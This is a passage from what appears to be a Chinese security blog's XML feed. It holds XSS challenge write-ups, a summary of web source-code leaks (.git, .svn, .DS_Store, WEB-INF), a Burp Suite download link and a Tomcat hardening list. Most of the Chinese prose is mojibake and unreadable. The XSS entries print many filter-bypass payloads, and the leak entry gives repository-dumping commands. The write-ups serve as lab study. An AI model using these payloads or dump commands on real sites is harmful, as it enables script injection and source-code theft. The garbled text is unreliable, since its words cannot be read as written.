æ­¤å®šä½contentIsLinkå‡½æ•°ï¼š12345function contentIsLink() &#123; return this.content.indexOf(&quot;&lt;a &quot;) == 0 &amp;&amp; (this.content.indexOf(&quot;&lt;a &quot;) == this.content.lastIndexOf(&quot;&lt;a &quot;) &amp;&amp; this.content.indexOf(&quot;&lt;/a&gt;&quot;) == this.content.length - 4); &#125; ç„¶åå¯ä»¥æ ¹æ®contentIsLinkå‡½æ•°æ„é€ å‡ºpayload:http://sqler.win/xss/level19.php?arg01=version&amp;arg02=%3Ca%20href=%22javascript:alert(1)%22%3E1%3C/a%3E Stage#20ï¼šhttp://sqler.win/xss/level20.php?arg01=a&amp;arg02=bæœ¬é¢˜ä¸ªäººæ„Ÿè§‰æ¯”ä¸Šä¸€é¢˜å®¹æ˜“åšå‡ºæ¥ï¼Œï¼Œä¸‹è½½swfæ–‡ä»¶ä½¿ç”¨JPEXSè¿›è¡Œåˆ†æåå¯ä»¥å‘ç°æ˜¯zeroclipboard.swfï¼Œç„¶åç™¾åº¦ä¸€å‘ï¼Œfreebufç¬¬ä¸€ä¸ªï¼Œç²˜è´´å³å¯payloadï¼šhttp://sqler.win/xss/xsf04.swf?id=\%22))}catch(e){(alert)(/XSS/.source);}//&amp;width=500&amp;height=500]]></content>
      <categories>
        <category>WEBå®‰å…¨</category>
      </categories>
      <tags>
        <tag>bypass</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æˆ‘ä¸XSSçš„æ„Ÿæƒ…ä¹‹è·¯(1)]]></title>
    <url>%2F2017%2F07%2F20%2F12%2F</url>
    <content type="text"><![CDATA[ç§‘æ™®XSSæ¼æ´æ˜¯ä¸€ç§ç»å¸¸å‡ºç°åœ¨webåº”ç”¨ä¸­çš„è®¡ç®—æœºå®‰å…¨æ¼æ´ï¼Œå®ƒå…è®¸æ¶æ„webç”¨æˆ·å°†ä»£ç æ¤å…¥åˆ°æä¾›ç»™å…¶å®ƒç”¨æˆ·ä½¿ç”¨çš„é¡µé¢ä¸­ã€‚æ¯”å¦‚è¿™äº›ä»£ç åŒ…æ‹¬HTMLä»£ç å’Œå®¢æˆ·ç«¯è„šæœ¬ã€‚æ”»å‡»è€…åˆ©ç”¨XSSæ¼æ´æ—è·¯æ‰è®¿é—®æ§åˆ¶â€”â€”ä¾‹å¦‚åŒæºç­–ç•¥(same origin policy)ã€‚è¿™ç§ç±»å‹çš„æ¼æ´ç”±äºè¢«é»‘å®¢ç”¨æ¥ç¼–å†™å±å®³æ€§æ›´å¤§çš„ç½‘ç»œé’“é±¼(Phishing)æ”»å‡»è€Œå˜å¾—å¹¿ä¸ºäººçŸ¥ã€‚å¯¹äºè·¨ç«™è„šæœ¬æ”»å‡»ï¼Œé»‘å®¢ç•Œå…±è¯†æ˜¯ï¼šè·¨ç«™è„šæœ¬æ”»å‡»æ˜¯æ–°å‹çš„â€œç¼“å†²åŒºæº¢å‡ºæ”»å‡»â€œï¼Œè€ŒJavaScriptæ˜¯æ–°å‹çš„â€œShellCodeâ€ã€‚æœ¬æ–‡ä¸»è¦æ˜¯é€šè¿‡å‡ ä¸ªåœ¨çº¿ç»ƒä¹ å¹³å°ï¼Œè®°å½•ä¸€ä¸‹ä¸ªäººå¯¹äºxssæ¼æ´çš„ä¸€äº›æ€è·¯å’Œæ€»ç»“ã€‚ å¹³å°1 xss-quizStage#1: http://xss-quiz.int21h.jp/?sid=2a75ff06e0147586b7ceb0fe68ee443b86a6e7b9 ä½¿ç”¨æ­£å¸¸xss payloadå¼¹å‡ºdomainå³å¯é€šè¿‡ã€‚payloadå¦‚ï¼š&lt;img onerrer=&quot;alert(document.domain);&quot;src=&gt; &lt;script&gt;alert(document.domain);&lt;/script&gt; Stage#2: http://xss-quiz.int21h.jp/stage2.php?sid=34ccb7f2bee3d0be52bf33339d0240c96f1cb61dè¿™ä¸€é¢˜å…³é”®åœ¨äºè¯­å¥éœ€è¦é—­åˆï¼Œå½“é—­åˆè¯­å¥åï¼Œå‡å¯è§¦å‘ã€‚payloadå¦‚ï¼š&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt; &quot;onclick=alert(document.domain) value=&quot;asd Stage#3: http://xss-quiz.int21h.jp/stage-3.php?sid=f3a8820ead8d740c43effd6cdae1fa1b41d0f0f7è¯¥é¢˜åœ¨å†™å…¥jsè¯­å¥åï¼Œå¯¹å°–æ‹¬å·è¿›è¡Œäº†è½¬ä¹‰ å°è¯•ç»•è¿‡ï¼Œæ²¡æœ‰å®ç°ï¼Œä½†æ˜¯å¯ä»¥åœ¨p2å‚æ•°çš„å‚æ•°å€¼å¤„æ„é€ è·¨ç«™è¯­å¥ï¼ŒæˆåŠŸå¼¹å‡ºdomain Stage#4: http://xss-quiz.int21h.jp/stage4.php?sid=9b47b7196b1da242b0d9ce4099ed0f17858b56e0p1ã€p2å‡ä½œè¿‡æ»¤äº†ï¼Œåœ¨p3å¤„é—­åˆè¯­å¥å³å¯å¼¹å‡ºï¼Œå¯é€šè¿‡æŸ¥çœ‹æºç å‘ç°éšè—çš„è¾“å…¥æ¡†ï¼Œä¿®æ”¹hackmeçš„é‚£ä¸ªtypeä¸ºtextï¼Œå³p3çš„è¾“å…¥ç‚¹å³å¯ï¼Œpayloadï¼š&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt; Stage#5: http://xss-quiz.int21h.jp/stage5.php?sid=b4d8b0467f463e3059a6e739d37739b6a364027eé•¿åº¦é™åˆ¶ï¼Œä½¿ç”¨burpæ”¹åŒ…ç»•è¿‡å³å¯ã€‚ä¹Ÿå¯ä»¥æ›´æ”¹å¦‚å›¾æ‰€ç¤ºé•¿åº¦è¿›è¡Œç»•è¿‡ï¼Œpayloadï¼š&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt; Stage#6: http://xss-quiz.int21h.jp/stage6.php?sid=a9998f35ee37ef3664ab6c6fc2574f428231c725è¯¥é¢˜è¿‡æ»¤äº†å°–æ‹¬å·&lt;&gt;ï¼Œå°è¯•ç»•è¿‡ï¼Œå‘ç°å¯ç”¨é¼ æ ‡ç§»åŠ¨ç±»è¿›è¡Œç»•è¿‡å¦‚ï¼š&quot;onmouseover=&quot;alert(document.domain);&quot; &quot;onmouseout=&quot;alert(document.domain);&quot; &quot;onclick=alert(document.domain)ç­‰ Stage#7: http://xss-quiz.int21h.jp/stage07.php?sid=deeba845f047ee9df2627ec269f20c955e2eb8b8é€šè¿‡æµ‹è¯•ï¼Œå‘ç°è¯¥é¢˜è¿‡æ»¤äº†&lt;&gt;ã€â€ã€&amp;ç­‰ï¼Œè€Œä¸”è¾“å…¥ç©ºæ ¼åè‡ªåŠ¨æ·»åŠ åŒå¼•å·ï¼Œå› æ­¤ï¼Œå¯æ„é€ æ­¤ç±»payloadå¦‚: a onmouseover=alert(document.domain)å®ç°å¼¹çª—ã€‚ Stage#8: http://xss-quiz.int21h.jp/stage008.php?sid=1f0696e59ff506dee925f3e6bd62e9f5103543aaæ­¤é¢˜é‡‡ç”¨javascriptä¼ªåè®®å³å¯ï¼Œæ¯”è¾ƒç®€å•ã€‚Payloadï¼šjavascript:alert(document.domain); ***Stage#9: http://xss-quiz.int21h.jp/stage_09.php?sid=9fb2098e09f0cdf338e09149e6f1550706fc3934æ­¤é¢˜æç¤ºä¿¡æ¯ä¸ºUTF7,å› æ­¤é€šè¿‡UTF-7è½¬ç å³å¯ï¼Œä¸ç”¨burpæˆªåŒ…ï¼Œéœ€è¦æ›´æ”¹charsetç±»å‹ä¸ºtextï¼Œå¹¶æ›´æ”¹å…¶valueä¸ºUTF-7,ç„¶åå³å¯å¼¹çª—payloadï¼š+ACIAIABvAG4AbQBvAHUAcwBlAG0AbwB2AGUAPQAiAGEAbABlAHIAdAAoAGQAbwBjAHUAbQBlAG4AdAAuAGQAbwBtAGEAaQBuACk- Stage#10: http://xss-quiz.int21h.jp/stage00010.php?sid=582038d983e1b7cff0888412ffa49b8ae03ecf38é€šè¿‡æç¤ºå¯çœ‹åˆ°domainè¢«è¿‡æ»¤äº†ï¼Œå¯ä½¿ç”¨dodomainmainåµŒå¥—çš„æ–¹å¼è¿›è¡Œç»•è¿‡ï¼Œå› æ­¤ï¼Œpayloadä¸ºï¼š&quot;onmouseover=&quot;alert(document.domdomainain);// Stage#11: http://xss-quiz.int21h.jp/stage11th.php?sid=57ea445522e17a40142908ada7bd665857c358d9å¯ä»¥ä»æç¤ºä¸­çœ‹åˆ°è¿‡æ»¤è§„åˆ™å¦‚ä¸‹ï¼šâ€s/script/xscript/ig;â€ and â€œs/on[a-z]+=/onxxx=/ig;â€ and â€œs/style=/stxxx=/ig;â€ï¼Œå› æ­¤å¯ä»¥é€šè¿‡è¿›è¡Œç¼–ç çš„æ–¹å¼æ„é€ xssè¯­å¥ã€‚æ³¨æ„é—­åˆå‰åã€‚å³å¯å¼¹çª—ï¼Œpayloadï¼š&quot;&gt;&lt;a href=javascr&amp;#105;pt:alert(document.domain)&gt;xss&lt;/a&gt; Stage#12: http://xss-quiz.int21h.jp/stage_no012.php?sid=7fc1df5b4cd62ce2afaaa11268a5039d3a67632aæ­¤é¢˜è¿‡æ»¤è§„åˆ™å¦‚ä¸‹ï¼šâ€s/[\x00-\x20\&lt;>\â€\â€™]//g;â€ï¼Œè¿‡æ»¤å¾ˆä¸¥ï¼Œä»x00-x20,&lt;&gt;,â€â€™éƒ½è¢«è¿‡æ»¤ï¼Œäºæ˜¯ç”¨ä»€ä¹ˆé—­åˆæ˜¯æ­¤é¢˜çš„å…³é”®ï¼Œåœ¨IE8ä¸‹å¯ä»¥é€šè¿‡è¿›è¡Œé—­åˆå› æ­¤ï¼Œå¯ä»¥æ„é€ payloadï¼š ` onmouseover=alert(document.domain); Stage#13: http://xss-quiz.int21h.jp/stage13_0.php?sid=eb77af0358676519402c3be00df480f638b168b7æ­¤é¢˜è¯´æ˜¯å†CSSä¸­ç”¨expressionæ¥å®ç°jsä¸­çš„onäº‹ä»¶ï¼Œè¿›è€Œæ‰§è¡Œxssè¯­å¥ï¼Œå†ieä¸‹å¯ä»¥åˆ©ç”¨ï¼Œpayloadå¦‚ä¸‹ï¼šxx:expression(onmouseover=function(){alert(document.domain)}) Stage#14: http://xss-quiz.int21h.jp/stage-_-14.php?sid=91443a5a0cc083c52ce78d11b5bf1beb238cb93bæ­¤é¢˜ä¸ä¸Šä¸€é¢˜ç›¸ä¼¼ï¼Œä½†æ˜¯åšäº†è¿‡æ»¤ï¼šs/(url|script|eval|expression)/xxx/ig;è¿‡æ»¤urlï¼Œevalï¼Œscriptï¼Œexpressionå› æ­¤ï¼Œéœ€è¦å°è¯•ç»•è¿‡è¿‡æ»¤ï¼Œç»è¿‡å°è¯•ï¼Œå¯ä»¥åˆ©ç”¨æ³¨é‡Šç¬¦/**/ã€\ã€\0ã€ç¼–ç ç­‰æ–¹å¼ç»•è¿‡ã€‚Payloadå¦‚ï¼šxx:expre/**/ssion(onmouseover=function(){alert(document.domain)}) Stage#15ï¼šhttp://xss-quiz.int21h.jp/stage__15.php?sid=26ac2a0522c04a788c217fd8d7847aab1626f726æœ¬é¢˜ç»è¿‡æµ‹è¯•å°†&lt;&gt;è¿›è¡Œäº†è½¬ä¹‰ï¼Œå¹¶ä¸”è¿‡æ»¤äº†\ï¼Œæ— æ³•ä½¿ç”¨äº‹ä»¶ç±»å‹æ„é€ è¯­å¥å®ç°å¼¹çª—ã€‚å› æ­¤è€ƒè™‘ç»•è¿‡å…¶è¿‡æ»¤è§„åˆ™ï¼Œç»è¿‡æµ‹è¯•ï¼Œå¯ä»¥ä½¿ç”¨ç¼–ç è¿›è¡Œç»•è¿‡å°†&lt;&gt;è¿›è¡Œ16è¿›åˆ¶ç¼–ç æˆ–è€…unicodeç¼–ç å³å¯ã€‚Payload:\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e Stage#16ï¼šhttp://xss-quiz.int21h.jp/stage00000016.php?sid=b3c99680d88d8f9002dce8b26f167c9c0a3a73a9æ­¤é¢˜ä¸ä¸Šä¸€é¢˜ç›¸ä¼¼ï¼Œå¤šä¸€éƒ¨åˆ†è¿‡æ»¤ï¼šâ€s/\x/\\x/ig;â€ï¼Œå› æ­¤æ— æ³•ä½¿ç”¨16è¿›åˆ¶æ¥ç»•è¿‡&lt;&gt;çš„è¿‡æ»¤ï¼Œç”¨unicodeç¼–ç åŒæ ·å¯ä»¥ç»•è¿‡ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨10è¿›åˆ¶ç»•è¿‡ã€‚Payload: \\74script\\76alert(document.domain);\\74/script\\76 Stage#17ã€Stage#18å› ä¸ºç‰ˆæœ¬é—®é¢˜ï¼Œè¿‡ä¸å»23333333ã€‚]]></content>
      <categories>
        <category>WEBå®‰å…¨</category>
      </categories>
      <tags>
        <tag>bypass</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Webæºç æ³„éœ²æ€»ç»“]]></title>
    <url>%2F2017%2F04%2F28%2F11%2F</url>
    <content type="text"><![CDATA[åœ¨webæ¸—é€æµ‹è¯•ä»¥åŠCTFä¸­ç»å¸¸å¯ä»¥é‡åˆ°æºç æ³„éœ²çš„é—®é¢˜ï¼Œæœ¬æ–‡å¯¹å¸¸è§çš„æºç æ³„éœ²è¿›è¡Œäº†ä¸€ä¸ªæ€»ç»“ï¼Œæœ‰æ–°çš„å§¿åŠ¿æŒç»­æ›´æ–°ï¼ 0x00 Mercurial .hgæºç æ³„éœ²hgåœ¨åˆå§‹åŒ–ä»£ç åº“çš„æ—¶å€™ï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹é¢äº§ç”Ÿä¸€ä¸ª.hgçš„éšè—æ–‡ä»¶ e.g.http://www.example.com/.hg/ åˆ©ç”¨ï¼šå·¥å…·dvcs-ripper rip-hg.pl -v -u http://www.example.com/.hg 0x01 .gitæºç æ³„æ¼åœ¨è¿è¡Œgit initåˆå§‹åŒ–çš„æ—¶å€™ï¼Œåœ¨å½“å‰ç›®å½•ä¸‹äº§ç”Ÿä¸€ä¸ªéšè—çš„.gitæ–‡ä»¶ï¼Œè¿™ä¸ªç›®å½•æ˜¯ Git ç”¨æ¥è·Ÿè¸ªç®¡ç†ç‰ˆæœ¬åº“çš„ï¼Œé‡Œé¢å­˜æ”¾äº†æ‰€æäº¤çš„æ–‡æ¡£ç´¢å¼•å†…å®¹ï¼ŒGit å¯ä»¥æ ¹æ®è¯¥æ–‡ä»¶å¤¹å†…çš„å†…å®¹å¯¹å…¶æ‰€ç®¡ç†çš„æ–‡æ¡£è¿›è¡Œå†…å®¹è·Ÿè¸ªï¼Œä»è€Œå®ç°ç‰ˆæœ¬æ§åˆ¶ã€‚å¦‚æœä½¿ç”¨è€…é‡‡ç”¨å¤åˆ¶æ•´ä¸ªæ–‡ä»¶å¤¹çš„æ–¹å¼å°†.gitæ–‡ä»¶éƒ¨ç½²ã€‚æˆ–è€…å…¶ä»–çš„é”™è¯¯æ“ä½œè®©.gitæ–‡ä»¶æš´éœ²åœ¨å¤–ç½‘ç¯å¢ƒä¸­ï¼Œæ”»å‡»è€…å°±å¯ä»¥åˆ©ç”¨ .git æ–‡ä»¶å¤¹å†…çš„æ–‡ä»¶ï¼Œè¿˜åŸé‡å»ºå·¥ç¨‹æºä»£ç ã€‚ e.g.http://www.example.com/.git/ åˆ©ç”¨ï¼šå·¥å…·ï¼šGitHack GitHack.py http://www.example.com/.git/è¯¥å·¥å…·å…¶ä»–ä¿¡æ¯å‚è€ƒï¼šhttp://www.freebuf.com/sectool/66096.html dvcs-ripper rip-git.pl -v -u http://www.example.com/.git/ 0x02 .DS_Storeæ–‡ä»¶æ³„æ¼åœ¨å‘å¸ƒä»£ç æ—¶æœªåˆ é™¤æ–‡ä»¶å¤¹ä¸­éšè—çš„.DS_storeï¼Œè¢«å‘ç°åï¼Œè·å–äº†æ•æ„Ÿçš„æ–‡ä»¶åç­‰ä¿¡æ¯ã€‚ e.g.http://www.example.com/.ds_store åˆ©ç”¨ï¼šå·¥å…·ï¼šdsstoreexp python ds_store_exp.py http://www.example.com/.DS_Store 0x03 .svnæ–‡ä»¶æ³„æ¼ä½¿ç”¨svnç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿæ—¶ï¼Œç”±äºé”™è¯¯æ“ä½œå°†.svnæ–‡ä»¶æš´éœ²åœ¨å¤–ç½‘ç¯å¢ƒä¸­ï¼Œå³å¯åˆ©ç”¨è¯¥æ–‡ä»¶è¿˜åŸå‡ºæœåŠ¡å™¨æºç ã€SVNæœåŠ¡å™¨è´¦å·å¯†ç ç­‰ä¿¡æ¯ã€‚ e.g.http://www.example.com/.svn/entries åˆ©ç”¨ï¼šå·¥å…·ï¼šdvcs-ripper rip-git.pl -v -u http://www.example.com/.git/ Seay-Svn å›¾å½¢åŒ–å·¥å…·ï¼Œä½¿ç”¨ç®€å• 0x04 .CVSæ–‡ä»¶æ³„æ¼åˆ©ç”¨ï¼š http://www.example.com/CVS/Root è¿”å›æ ¹ä¿¡æ¯http://www.example.com/CVS/Entries è¿”å›æ‰€æœ‰æ–‡ä»¶çš„ç»“æ„bk clone http://www.example.com/test dir æŠŠè¿œç«¯ä¸€ä¸ªåä¸ºtestçš„repo cloneåˆ°æœ¬åœ°åä¸ºdirçš„ç›®å½•ä¸‹.bk changes æŸ¥çœ‹æ‰€æœ‰çš„æ”¹å˜çš„å‘½ä»¤ï¼Œè½¬åˆ°downloadçš„ç›®å½• ##0x05 Bazaar/bzrBazaaræ˜¯ä¸€ä¸ªç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œå¯å¸®åŠ©ä½ éšæ—¶è¿½è¸ªé¡¹ç›®çš„å†å²ï¼Œå¹¶ä¸ä»–äººå¼€å±•ä¾¿åˆ©åœ°åˆä½œã€‚ åˆ©ç”¨:å·¥å…·ï¼šdvcs-ripper rip-bzr.pl -v -u http://www.example.com/.bzr/ 0x06 å¤‡ä»½æ–‡ä»¶åˆé›†ï¼šåœ¨CTFä¸­ï¼Œå¤‡ä»½æ–‡ä»¶è¿™ä¸ªè€ƒç‚¹ç»å¸¸å‡ºç°ï¼Œè€Œåœ¨å¯¹ç½‘ç«™è¿›è¡Œä¿®æ”¹æˆ–è€…å‡çº§è¿‡ç¨‹ä¸­ä¹Ÿä¼šç”Ÿæˆå¤‡ä»½æ–‡ä»¶ï¼Œå¦‚æœè¿™äº›æ–‡ä»¶æœªåŠæ—¶åˆ é™¤ï¼Œè€Œä¸”æ–‡ä»¶åˆèƒ½è¢«è®¿é—®åˆ°æ—¶ï¼Œå°±å¾ˆæœ‰å¯èƒ½è¢«æ¶æ„ä¸‹è½½ï¼Œåˆ©ç”¨ã€‚å¸¸è§æ ¼å¼ï¼š1234567891011121314151617.php~.un~.swp.rar.zip.7z.tar.gz.tar.gz.~.bak.txt.html.vim.swn.swo.old 0x07 WEB-INF/web.xmlæ³„éœ²WEB-INFæ˜¯Javaçš„WEBåº”ç”¨çš„å®‰å…¨ç›®å½•ã€‚å¦‚æœæƒ³åœ¨é¡µé¢ä¸­ç›´æ¥è®¿é—®å…¶ä¸­çš„æ–‡ä»¶ï¼Œå¿…é¡»é€šè¿‡web.xmlæ–‡ä»¶å¯¹è¦è®¿é—®çš„æ–‡ä»¶è¿›è¡Œç›¸åº”æ˜ å°„æ‰èƒ½è®¿é—®WEB-INFä¸»è¦åŒ…å«ä»¥ä¸‹æ–‡ä»¶æˆ–ç›®å½•ï¼š /WEB-INF/web.xmlï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚/WEB-INF/classes/ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classã€‚/WEB-INF/lib/ï¼šå­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶/WEB-INF/src/ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶ã€‚/WEB-INF/database.propertiesï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶ã€‚ åˆ©ç”¨ï¼šé€šè¿‡æ‰¾åˆ°web.xmlæ–‡ä»¶ï¼Œæ¨æ–­classæ–‡ä»¶è·¯å¾„ï¼Œæœ€åä¸‹è½½classæ–‡ä»¶ï¼Œé€šè¿‡åç¼–è¯‘classæ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç ã€‚ é˜²å¾¡ï¼šç¦æ­¢è®¿é—®WEB-INFç›®å½•ï¼šlocation ~ ^/WEB-INF/* { deny all; }]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>æºä»£ç æ³„éœ²</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[burpsuiteèµ„æº]]></title>
    <url>%2F2017%2F03%2F27%2F10%2F</url>
    <content type="text"><![CDATA[è¿‘æ—¥å‘ç°ä¸€æœ¬è€å¸æœºä¸­æ–‡ç‰ˆçš„burpsuiteå¼€è½¦æŒ‡å—ï¼Œåˆ†æƒ³ç»™å¤§å®¶ï¼Œå¦å¤–é™„ä¸Šå·¥å…·ä¸€ä»½ï¼›è€Œä¸”å¸¦æœ‰å®ä¾‹è¯´æ˜ï¼Œé€‚åˆå­¦ä¹ ã€‚ è¡¥å……burpsuite ä½¿ç”¨gitbookæ‰‹å†Œï¼šhttps://t0data.gitbooks.io/burpsuiteæ„Ÿè°¢ä½œè€…çš„è´¡çŒ®~~åˆ†äº«é“¾æ¥http://pan.baidu.com/s/1c2qv5sO å¯†ç ï¼švwfs]]></content>
      <categories>
        <category>ç¥å™¨</category>
      </categories>
      <tags>
        <tag>burpsuite</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Tomcatå®‰å…¨åŠ å›º]]></title>
    <url>%2F2017%2F03%2F27%2F9%2F</url>
    <content type="text"><![CDATA[æ€»ç»“ä¸€äº›tomcatåŠ å›ºçš„è¦ç‚¹ï¼š1ã€åˆ é™¤$CATALINA_HOME/webappsä¸‹é»˜è®¤çš„æ‰€æœ‰ç›®å½•æ–‡ä»¶ã€‚å› ä¸ºçº¿ä¸Šæ˜¯ä¸ä½¿ç”¨ Tomcat é»˜è®¤æä¾›çš„ç®¡ç†é¡µé¢ï¼Œå¦å¤–åˆ æ‰ç®¡ç†é¡µé¢çš„ä¸¤ä¸ªé…ç½®æ–‡ä»¶host-manager.xmlå’Œmanager.xmlã€‚ä½äº$CATALINA_HOME/conf/Catalina/localhostã€‚2ã€ä¸ºäº†tomcatç‰ˆæœ¬ä¿¡æ¯æ³„éœ²ï¼Œéšè—æˆ–è€…ä¼ªè£…tomcatçš„ç‰ˆæœ¬ä¿¡æ¯ã€‚é»˜è®¤Tomcatçš„ç‰ˆæœ¬ä¿¡æ¯å¦‚ä¸‹:æ–¹æ³•1ã€è§£å‹ä¸‹å›¾jaråŒ…ï¼Œå¾—åˆ°META-INFå’Œorgæ–‡ä»¶ï¼Œä¿®æ”¹org/apache/catalina/util/ServerInfo.properties æ–‡ä»¶ä¸­çš„serverinfoå­—æ®µå®ç°æ›´æ”¹tomcatçš„ç‰ˆæœ¬ä¿¡æ¯ä¿®æ”¹å®Œä¹‹åï¼šæ–¹æ³•2ã€ä¿®æ”¹$CATALINA_HOME/conf/server.xmlï¼Œåœ¨ConnectorèŠ‚ç‚¹æ·»åŠ serverå­—æ®µã€‚3ã€ç”¨æˆ·ç®¡ç†:å¦‚æœä¸éœ€è¦webéƒ¨ç½²åº”ç”¨ï¼Œå¯ä»¥æ³¨é‡Šæˆ–è€…åˆ é™¤tomcat-users.xmlä¸‹ç”¨æˆ·æƒé™ç›¸å…³é…ç½® 4ã€å¦‚ä¸éœ€è¦è‡ªåŠ¨éƒ¨ç½²ï¼Œå…³é—­è‡ªåŠ¨éƒ¨$CATALINA_HOME/ç½²åŠŸèƒ½ä¿®æ”¹conf/server.xmlä¸­çš„hostå­—æ®µï¼Œå°†ä¸‹å›¾å¤„ä¿®æ”¹ä¸ºï¼šunpackWARs=â€falseâ€ autoDeploy=â€falseâ€ã€‚5ã€å¯åŠ¨cookieçš„httpOnlyå±æ€§ï¼›ä¿®æ”¹ $CATALINA_HOME/conf/context.xmlä¸­æ·»åŠ å¦‚ä¸‹å›¾æ‰€ç¤ºé…ç½®ï¼šå¯åŠ¨cookieçš„secureå±æ€§ï¼Œåªå…è®¸cookieåœ¨åŠ å¯†æ–¹å¼ä¸‹ä¼ è¾“ï¼›åœ¨web.xmlä¸­sesion-configèŠ‚ç‚¹é…ç½®cooker-configã€‚6ã€æœåŠ¡æƒé™æ§åˆ¶ï¼štomcatä»¥érootæƒé™å¯åŠ¨ï¼Œåº”ç”¨éƒ¨ç½²ç›®å½•æƒé™å’ŒtomcatæœåŠ¡å¯åŠ¨ç”¨æˆ·åˆ†ç¦»ï¼Œå¦‚tomcatä»¥tomcatç”¨æˆ·å¯åŠ¨ï¼Œè€Œéƒ¨ç½²åº”ç”¨çš„ç›®å½•è®¾ç½®ä¸ºnobodyç”¨æˆ·750.7ã€AJPç«¯å£ç®¡ç†AJPæ˜¯ä¸º Tomcat ä¸ HTTP æœåŠ¡å™¨ä¹‹é—´é€šä¿¡è€Œå®šåˆ¶çš„åè®®ï¼Œèƒ½æä¾›è¾ƒé«˜çš„é€šä¿¡é€Ÿåº¦å’Œæ•ˆç‡ã€‚å¦‚æœtomcatå‰ç«¯æ”¾çš„æ˜¯apacheçš„æ—¶å€™ï¼Œä¼šä½¿ç”¨åˆ°AJPè¿™ä¸ªè¿æ¥å™¨ã€‚å‰ç«¯å¦‚æœæ˜¯ç”±nginxåšçš„åå‘ä»£ç†çš„è¯å¯ä»¥ä¸ä½¿ç”¨æ­¤è¿æ¥å™¨ï¼Œå› æ­¤éœ€è¦æ³¨é”€æ‰è¯¥è¿æ¥å™¨ã€‚ä¿®æ”¹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š 8ã€ç¦æ­¢åˆ—ç›®å½•ï¼šä¿®æ”¹web.xmlå¦‚ä¸‹å›¾æ‰€ç¤º 9ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢ï¼ˆ40Xã€50Xï¼‰ï¼Œé˜²æ­¢ä¿¡æ¯æ³„éœ²ï¼š 10ã€ä¾æ®å®é™…æƒ…å†µï¼Œå®šä¹‰ä¼šè¯è¶…æ—¶æ—¶é—´ï¼š11ã€åˆç†è®¾ç½®maxThreadsï¼Œä¸€èˆ¬è®¾ç½®ä¸º8000ä»¥ä¸‹ï¼Œå¦‚æœç½‘å€è®¿é—®é‡éå¸¸å¤§ï¼Œå»ºè®®è¿è¡Œå¤šä¸ªtomcatåšè´Ÿè½½å‡è¡¡å¤„ç†ä¸”éœ€æ³¨æ„jvmçš„å‚æ•°é…ç½®ã€‚å½“å¿ƒç”±äºjvmå‚æ•°è¿‡å°è€Œå´©æºƒã€‚é…ç½®å‘½ä»¤åœ¨$CATALINA_HOME/conf/server.xmlä¸­ã€‚12ã€å¼ºçƒˆå»ºè®®ä¸è¦ä½¿ç”¨ Tomcat çš„è™šæ‹Ÿä¸»æœºï¼Œæ¨èæ¯ä¸ªç«™ç‚¹ä½¿ç”¨ä¸€ä¸ªå®ä¾‹ã€‚å³å¯ä»¥å¯åŠ¨å¤šä¸ª Tomcatã€‚é‡Œé¢åŒ…å«å¤šä¸ªè™šæ‹Ÿä¸»æœºã€‚å› ä¸ºtomcatæ˜¯å¤šçº¿ç¨‹ï¼Œå…±äº«å†…å­˜ï¼Œä»»ä½•ä¸€ä¸ªè™šæ‹Ÿä¸»æœºä¸­çš„åº”ç”¨å´©æºƒï¼Œéƒ½ä¼šå½±å“åˆ°æ‰€æœ‰åº”ç”¨ç¨‹åºã€‚è™½ç„¶é‡‡ç”¨å¤šå®ä¾‹çš„æ–¹å¼ä¼šäº§ç”Ÿè¿‡å¤šçš„å¼€é”€ï¼Œä½†è‡³å°‘ä¿éšœäº†åº”ç”¨ç¨‹åºçš„éš”ç¦»å’Œå®‰å…¨ã€‚æ³¨æ„å‡çº§è¿‡ç¨‹ä¸­ï¼š1ã€é¿å…è·¨å¤§ç‰ˆæœ¬çš„å‡çº§2ã€å°†å½“å‰è€ç‰ˆæœ¬tomcatçš„server.xml(Tomcatä¸»é…ç½®æ–‡ä»¶Serverã€Serviceã€Engineã€Hostã€Contextã€Connector)ã€catalina.sh(é…ç½®ç¯å¢ƒcontext 